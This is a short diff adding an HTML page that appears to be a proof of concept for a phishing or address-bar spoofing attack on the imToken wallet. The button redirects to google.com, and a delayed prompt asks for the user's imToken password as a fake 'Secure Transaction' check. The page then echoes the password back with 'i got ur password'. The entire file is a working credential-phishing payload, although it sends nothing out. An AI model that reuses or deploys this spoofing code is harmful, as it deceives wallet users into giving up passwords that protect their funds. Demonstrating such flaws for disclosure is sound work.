@@ -1,0 +1,33 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Transaction</title>
+</head>
+<body>
+    <button id="triggerBtn">Transaction</button>
+
+    <script>
+        document.getElementById('triggerBtn').onclick = () => {
+            // Redirect to the trusted page
+            window.location.href = 'https://www.google.com';
+
+            // Prompt for user input after delay
+            setTimeout(() => {
+                const userPassword = prompt('Secure Transaction: Please enter your imToken password to verify:');
+                if (userPassword) {
+                    document.open();
+                    document.write('example<br>i got ur password: ' + userPassword);
+                    document.close();
+                } else {
+                    document.open();
+                    document.write('No password entered.');
+                    document.close();
+                }
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
